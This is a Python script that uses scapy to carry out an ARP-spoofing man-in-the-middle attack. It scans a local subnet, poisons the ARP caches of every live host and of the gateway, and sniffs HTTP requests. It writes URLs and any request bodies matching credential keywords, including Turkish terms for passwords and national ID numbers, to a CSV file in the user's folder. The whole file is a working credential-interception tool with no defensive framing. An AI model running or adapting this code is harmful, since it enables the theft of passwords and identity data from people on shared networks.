from multiprocessing import Process,freeze_support
import ipaddress
from scapy.all import Ether, ARP, srp, send ,sr,IP,ICMP,TCP
import scapy.all as scapy
import argparse
import time
import os
from scapy.layers import http
import sys
import csv

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    
def _enable_windows_iproute():
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

def sniffer(callback):
    scapy.sniff(store = 1, prn = callback)

def process_packet(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            cred = get_credentials(packet)
            if not "lol" in url:
                with open(f"C:\\Users\\{os.getenv('username')}\\lol.csv", 'a', newline='') as csvfile:
                    spamwriter = csv.writer(csvfile, delimiter=' ',
                    quotechar='|', quoting=csv.QUOTE_MINIMAL)
                    spamwriter.writerow(["HTTP,",url])
                    if cred:
                        print('\n\n[+] Possible Credential Information -> {}'.format(cred), '\n\n')
                        spamwriter.writerow(['CRED,',cred])
                    print('[+] HTTP Requests/URL Requested -> {}'.format(url), '\n')
    except:
        pass

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name','tckimlikno',"musteri","sifre")

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load.lower():
                return field_load
def _scan(i):
    ans,unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=str(i)), timeout=0.1, verbose=1)
    return ans,unans
def scan(ip,s_sleep):
    ips = list(ip)
    i2 = 0
    if type(ips) == list:
        returns = []
        print(ips)
        for i in ips:
            
            ans, unans = _scan(i)
            print(unans)
            print(str(i))
            if ans:
                returns.append(str(i))
                print(ans)
            time.sleep(float(s_sleep))
        return returns

def run(host=None, victims=None,callback=process_packet):
    # gateway ip address
    host = host
    victims = victims
    s_sleep = 0.05
    s_time = 5
    arpsp_sleep=0.1
    if os.path.exists("config.txt"):
        with open(f"config.txt", 'r', newline='') as e: #192.168.1.1:192.168.1.0/24:5:0.05:1
            e = e.read().split("$")
            host = e[0]
            victims = e[1] #"192.168.0.0/20"
            s_time = e[2] 
            s_sleep = e[3]
            arpsp_sleep = e[4]
    net4 = ipaddress.ip_network(victims)
    # print progress to the screen
    results = scan(net4.hosts(),s_sleep)
    verbose = True
    try:
        p = Process(target=sniffer(callback=callback))
        p.start()
        print(results)
        while True:
            t_end = time.time() + 60 * float(s_time)
            while time.time() < t_end:
                # do whatever you do
                for target in results:
                    # telling the `target` that we are the `host`
                    spoof(target, host, verbose)
                    # telling the `host` that we are the `target`
                    spoof(host, target, verbose)
                    print("doing")
                    # sleep for one second
                    time.sleep(float(arpsp_sleep))
            results = scan(net4.hosts(),s_sleep)

    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please await...")
        restore(target, host)
        restore(host, target)

if __name__ == "__main__":
    freeze_support()
    host = "192.168.1.1"
    victims = "192.168.1.0/24"
    run(host,victims)